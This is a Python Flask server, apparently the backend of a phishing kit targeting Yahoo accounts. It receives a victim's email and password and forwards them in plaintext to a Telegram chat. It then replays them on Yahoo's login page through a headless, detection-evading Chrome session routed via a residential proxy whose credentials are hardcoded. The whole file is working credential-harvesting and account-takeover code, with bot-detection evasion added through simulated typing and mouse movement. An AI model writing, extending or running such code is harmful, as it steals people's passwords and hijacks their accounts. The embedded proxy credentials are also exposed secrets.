from flask import Flask, request, jsonify
from flask_cors import CORS
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import json
import random
import telebot
from threading import Thread
from selenium.webdriver.common.action_chains import ActionChains
import os

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

PROXY_HOST = "us.decodo.com"
PROXY_PORT = "10000"
PROXY_USER = "sph7g5g4xx"
PROXY_PASS = "zEfr90tw8nZh5uHWr_"

bot = telebot.TeleBot(BOT_TOKEN)

def create_proxy_extension():
    ext_dir = "temp_proxy_auth"
    os.makedirs(ext_dir, exist_ok=True)

    manifest = {"version": "1.0.0", "manifest_version": 2, "name": "Proxy Auth",
                "permissions": ["proxy", "tabs", "<all_urls>", "webRequest", "webRequestBlocking"],
                "background": {"scripts": ["background.js"]}}

    background = f'''var config = {{ mode: "fixed_servers", rules: {{ singleProxy: {{ scheme: "http", host: "{PROXY_HOST}", port: parseInt("{PROXY_PORT}") }} }} }};
chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
function callbackFn(d) {{ return {{ authCredentials: {{ username: "{PROXY_USER}", password: "{PROXY_PASS}" }} }}; }}
chrome.webRequest.onAuthRequired.addListener(callbackFn, {{urls: ["<all_urls>"]}}, ['blocking']);'''

    with open(f"{ext_dir}/manifest.json", "w") as f: json.dump(manifest, f, indent=2)
    with open(f"{ext_dir}/background.js", "w") as f: f.write(background)
    return os.path.abspath(ext_dir)

def human_type(element, text):
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(0.08, 0.25))

def random_mouse_move(driver):
    try:
        actions = ActionChains(driver)
        for _ in range(random.randint(4, 8)):
            actions.move_by_offset(random.randint(-80, 80), random.randint(-60, 60)).perform()
            time.sleep(random.uniform(0.4, 0.9))
    except:
        pass

@app.route('/start_login', methods=['POST'])
def start_login():
    data = request.json
    email = data.get('email')
    password = data.get('password')

    if not email or not password:
        return jsonify({"error": "Missing credentials"}), 400

    bot.send_message(CHAT_ID, f"📧 New Login Request:\nEmail: {email}\nPassword: {password}")

    Thread(target=selenium_login, args=(email, password)).start()
    return jsonify({"success": True})

def selenium_login(email, password):
    driver = None
    try:
        bot.send_message(CHAT_ID, f"🔄 Starting login for {email}")

        ext_path = create_proxy_extension()

        options = uc.ChromeOptions()
        options.headless = True
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--ignore-certificate-errors")
        options.add_argument(f"--load-extension={ext_path}")
        options.binary_location = "/usr/bin/google-chrome"

        driver = uc.Chrome(options=options, use_subprocess=True)

        driver.get("https://login.yahoo.com/")
        time.sleep(10)

        wait = WebDriverWait(driver, 40)

        username_field = wait.until(EC.element_to_be_clickable((By.NAME, "username")))
        random_mouse_move(driver)
        human_type(username_field, email)
        driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()
        time.sleep(8)

        password_field = wait.until(EC.element_to_be_clickable((By.NAME, "password")))
        random_mouse_move(driver)
        human_type(password_field, password)
        driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()

        bot.send_message(CHAT_ID, "⏳ Checking result...")
        time.sleep(15)

        bot.send_message(CHAT_ID, "✅ Attempt finished.")

    except Exception as e:
        bot.send_message(CHAT_ID, f"❌ Error: {str(e)[:200]}")
    finally:
        if driver:
            driver.quit()

if __name__ == '__main__':
    print("🚀 Backend Started")
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5001)), debug=False)
